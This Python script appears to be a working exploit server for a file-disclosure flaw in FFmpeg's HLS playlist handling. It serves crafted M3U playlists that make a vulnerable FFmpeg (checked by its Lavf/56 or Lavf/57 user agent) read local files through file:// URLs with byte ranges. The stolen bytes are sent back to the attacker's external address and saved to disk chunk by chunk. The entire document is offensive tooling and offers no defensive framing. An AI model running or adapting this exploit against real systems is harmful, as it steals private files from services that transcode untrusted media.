#!/usr/bin/env python3
import asyncio
import argparse
import logging
import traceback
import codecs
import random
import os

logger = logging.getLogger(__name__)

COMMON_HEADER = """#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
"""

COMMON_FOOTER = """

#EXT-X-ENDLIST
"""

INITIAL_TEMPLATE = COMMON_HEADER + """
http://{external_addr}:{listen_port}/save_data.m3u?filename={filename}&exploit_id={exploit_id}&first_time=true
""" + COMMON_FOOTER

REQUEST_DATA_TEMPLATE = COMMON_HEADER + """
http://{external_addr}:{listen_port}/prefix.m3u?filename={filename}&exploit_id={exploit_id}&offset={offset}&num_retry={num_retry}
#EXTINF:1.0
#EXT-X-BYTERANGE: {read_size}@{offset}
file://{filename}
#EXTINF:1.0
http://{external_addr}:{listen_port}/footer.m3u
""" + COMMON_FOOTER


PREFIX_TEMPLATE = COMMON_HEADER + """
#EXT-X-ENDLIST
http://{external_addr}:{listen_port}/save_data.m3u?filename={filename}&exploit_id={exploit_id}&offset={offset}&num_retry={num_retry}&file_data="""


RESPONSE_HEADER = """HTTP/1.0 200 OK\r
Content-Length: {content_length}\r
\r
"""

RESPONSE_HEADER_PARTIAL = """HTTP/1.0 206 Partial\r
Content-Length: {content_length}\r
Content-Range: bytes {range_start}-{range_finish}/{range_finish}
\r
"""



BAD_REQUEST = b"HTTP/1.0 400 Bad Request\r\n\r\n"

class FileDumper:
    def __init__(self, loop, listen_port, external_addr):
        self._loop = loop
        self._listen_port = listen_port
        self._external_addr = external_addr
        self._handlers = {"/initial.m3u" : self.initial,
                          "/prefix.m3u" : self.prefix,
                          "/save_data.m3u" : self.save_data,
                          "/footer.m3u" : self.footer}

        self._exploit_info = {}

    def initial(self, params, data):
        exploit_id = self.get_random_hex(8)
        self._exploit_info[exploit_id] = {}
        return INITIAL_TEMPLATE.format(external_addr=self._external_addr, listen_port=self._listen_port, exploit_id=exploit_id, **params).encode()

    def get_random_hex(self, size):
        return ''.join(map('{:02x}'.format, (random.randrange(256) for i in range(size))))

    def prefix(self, params, data):
        if self._exploit_info[params['exploit_id']]['times_prefix_requested']:
            raise RuntimeError()
        self._exploit_info[params['exploit_id']]['times_prefix_requested'] = 1
        return PREFIX_TEMPLATE.format(external_addr=self._external_addr, listen_port=self._listen_port, **params).encode()

    def save_to_local_file(self, exploit_id, remote_filename, offset, data):
        local_filename = ''.join(c if c.isalnum() else '_' for c in exploit_id + '___' + remote_filename)
        if not os.path.exists(local_filename):
            with open(local_filename, 'w'):
                pass
        with open(local_filename, 'rb+') as f:
            f.seek(offset)
            f.write(data)
        logger.info('saved {} bytes to {}'.format(len(data), local_filename))

    def save_data(self, params, data):
        if 'first_time' in params:
            new_offset = 0
            new_num_retry = 0
            self._exploit_info[params['exploit_id']]['last_offset'] = 0
        else:
            offset = int(params['offset'])
            if not data:
                new_num_retry = int(params['num_retry']) + 1
                if new_num_retry > 10:
                    raise RuntimeError('num_retry > 10')
            else:
                self.save_to_local_file(params['exploit_id'], params['filename'], offset, data)
                new_num_retry = 0

            new_offset = offset + len(data) + 1


        new_params = dict(params)
        new_params['offset'] = new_offset
        new_params['num_retry'] = new_num_retry
        self._exploit_info[params['exploit_id']]['times_prefix_requested'] = 0
        self._exploit_info[params['exploit_id']]['last_offset'] = new_offset
        return REQUEST_DATA_TEMPLATE.format(external_addr=self._external_addr, listen_port=self._listen_port, read_size=1000, **new_params).encode()

    def footer(self, params, data):
        return COMMON_FOOTER

    async def write_response(self, writer, response_body, content_start):
        if content_start is None:
            response = RESPONSE_HEADER.format(content_length=len(response_body)).encode()
        else:
            response = RESPONSE_HEADER_PARTIAL.format(content_length=len(response_body), range_start=content_start, range_finish=content_start+len(response_body)).encode()
        if isinstance(response_body, str):
            response += response_body.encode()
        else:
            response += response_body

        print(repr(response))
        writer.write(response)
        await writer.drain()

    async def error(self, error, writer):
        logger.error(error)
        writer.write(BAD_REQUEST)
        await writer.drain()

    async def handle_client(self, reader, writer):
        client_addr = "<UNKNOWN>"
        try:
            client_addr = writer.get_extra_info('peername')
            logger.info('{}: client connected'.format(client_addr))
            data = request_data = b''
            while b'\r\n\r\n' not in data:
                read_data = await asyncio.wait_for(reader.read(1000), 60)
                if not read_data:
                    raise RuntimeError('cant read request, {!r}', data)
                data += read_data
                request_data = data
                logger.warning('{}: request data {!r}'.format(client_addr, request_data))

            if b' HTTP/1.' not in data or not data.startswith(b'GET '):
                await self.error('{}: got bad request {!r}'.format(client_addr, data), writer)
                return

            if b'Lavf/56' not in data and b'Lavf/57' not in data:
                await self.error('{}: unknown ffmpeg version {!r}'.format(client_addr, data), writer)
                return

            content_start = None
            RANGE_MARK = b'Range: bytes='
            if RANGE_MARK in data:
                pos = data.find(RANGE_MARK) + len(RANGE_MARK)
                content_start = 0
                while chr(data[pos]).isdigit():
                    content_start = content_start * 10 + int(chr(data[pos]))
                    pos += 1

            data = data[4:data.find(b' HTTP/1.')]

            logger.info('{}: got request {!r}'.format(client_addr, data))

            if b'file_data=' in data:
                data, _, file_data = data.partition(b'file_data=')
            else:
                file_data = None

            data = data.decode('utf8')

            requested_file, _, params_str = data.partition('?')

            if requested_file not in self._handlers:
                await self.error('{}: unknown file requested {!r}'.format(client_addr, requested_file), writer)
                return


            params = {}
            for param_str in params_str.split('&'):
                param_name, _, param_value = param_str.partition('=')
                params[param_name] = param_value

            response = self._handlers[requested_file](params, file_data)
            await self.write_response(writer, response, content_start)
        except:
            logging.exception("{}: exception during processing request, data = {!r}".format(client_addr, request_data))
        finally:
            writer.close()

    def start(self):
        return asyncio.start_server(self.handle_client, port=self._listen_port)

if __name__ == "__main__":
    logging.basicConfig(format="%(asctime)s %(levelname)s %(message)s", level=logging.INFO)
    parser = argparse.ArgumentParser(description="pipelining proxy")
    parser.add_argument('--port', type=int, required=True)
    parser.add_argument('--external-addr', type=str, required=True)


    args = parser.parse_args()

    loop = asyncio.get_event_loop()

    server = FileDumper(loop, args.port, args.external_addr)
    loop.run_until_complete(server.start())
    loop.run_forever()
    loop.close()
